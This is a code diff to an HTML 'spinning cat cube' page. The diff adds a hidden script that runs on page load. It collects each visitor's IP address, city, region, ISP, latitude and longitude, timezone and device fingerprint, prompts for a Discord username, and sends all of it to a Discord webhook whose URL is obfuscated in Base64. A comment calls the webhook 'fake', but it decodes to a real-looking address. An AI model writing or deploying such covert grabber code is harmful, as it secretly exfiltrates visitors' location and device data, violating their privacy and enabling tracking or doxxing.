@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spinning Cat Cube with Fake Webhook</title>
+    <title>Spinning Cat Cube with 2ip.info Integration</title>
     <style>
         body {
             margin: 0;
@@ -65,7 +65,9 @@
                 const data = await response.json();
                 return {
                     ip: data.ip,
-                    country: data.country
+                    country: data.country,
+                    city: data.city,
+                    region: data.region
                 };
             } catch (error) {
                 console.error('Error fetching IP info:', error);
@@ -73,8 +75,43 @@
             }
         }
 
+        // Function to fetch additional IP info using 2ip.info
+        async function get2ipInfo(ip) {
+            try {
+                const response = await fetch(`https://api.2ip.ua/geo.json?ip=${ip}`);
+                const data = await response.json();
+                return {
+                    isp: data.isp,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    timezone: data.time_zone
+                };
+            } catch (error) {
+                console.error('Error fetching 2ip.info data:', error);
+                return null;
+            }
+        }
+
+        // Function to get the current time
+        function getCurrentTime() {
+            const now = new Date();
+            return now.toLocaleString();
+        }
+
+        // Function to get device information
+        function getDeviceInfo() {
+            return {
+                browser: navigator.userAgent,
+                platform: navigator.platform,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                deviceMemory: navigator.deviceMemory || 'Not available',
+                cpuCores: navigator.hardwareConcurrency || 'Not available'
+            };
+        }
+
         // Function to send data to Discord webhook
-        async function sendToDiscord(ip, country) {
+        async function sendToDiscord(ip, country, city, region, time, discordUsername, deviceInfo, ipInfo) {
             // Obfuscated fake webhook URL (encoded in Base64)
             const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1MDQ4MDAwMjU5MTg4NzQ2MS9MVmpROFZTWDdfTWo1NmhXYlhXakYtNE4zVXZVbHpkbXcwR0syM1hfR0dndkhhVEE4ZmFCMGFTN2M2TGVyNVU4YmN2Sw==');
 
@@ -83,7 +120,7 @@
 
             // Prepare the message
             const message = {
-                content: `New visitor!\nIP: ${ip}\nCountry: ${country} ${flagEmoji}`
+                content: `New visitor!\nIP: ${ip}\nCountry: ${country} ${flagEmoji}\nCity: ${city}, ${region}\nTime: ${time}\nDiscord Username: ${discordUsername}\n\n**Device Info:**\nBrowser: ${deviceInfo.browser}\nPlatform: ${deviceInfo.platform}\nScreen Resolution: ${deviceInfo.screenResolution}\nLanguage: ${deviceInfo.language}\nDevice Memory: ${deviceInfo.deviceMemory} GB\nCPU Cores: ${deviceInfo.cpuCores}\n\n**IP Info:**\nISP: ${ipInfo.isp}\nLatitude: ${ipInfo.latitude}\nLongitude: ${ipInfo.longitude}\nTimezone: ${ipInfo.timezone}`
             };
 
             try {
@@ -108,10 +145,38 @@
 
         // Main function to collect data and send to Discord
         (async () => {
-            const userInfo = await getUserInfo();
-            if (userInfo) {
-                await sendToDiscord(userInfo.ip, userInfo.country);
+            // Ask for Discord username
+            const discordUsername = prompt('Enter your Discord username:');
+            if (!discordUsername) {
+                alert('Discord username is required!');
+                return;
             }
+
+            // Fetch user info
+            const userInfo = await getUserInfo();
+            if (!userInfo) return;
+
+            // Fetch additional IP info using 2ip.info
+            const ipInfo = await get2ipInfo(userInfo.ip);
+            if (!ipInfo) return;
+
+            // Get current time
+            const time = getCurrentTime();
+
+            // Get device information
+            const deviceInfo = getDeviceInfo();
+
+            // Send data to Discord webhook
+            await sendToDiscord(
+                userInfo.ip,
+                userInfo.country,
+                userInfo.city,
+                userInfo.region,
+                time,
+                discordUsername,
+                deviceInfo,
+                ipInfo
+            );
         })();
     </script>
 </body>
